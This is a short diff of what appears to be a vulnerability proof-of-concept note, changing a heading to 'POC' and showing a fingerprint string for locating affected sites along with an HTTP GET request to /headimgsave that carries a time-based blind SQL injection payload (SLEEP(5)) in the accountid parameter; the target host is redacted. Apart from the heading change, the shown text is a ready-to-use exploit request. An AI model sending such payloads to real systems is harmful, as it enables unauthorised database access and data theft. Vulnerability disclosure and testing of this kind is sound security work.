@@ -8,7 +8,7 @@
 body="/common/scripts/basic.js"
 ```
 
-## poc
+## POC
 ```
 GET /headimgsave?accountid=1'+AND+(SELECT+*+FROM+(SELECT+SLEEP(5))x)--+ HTTP/1.1
 Host: [已模糊处理]
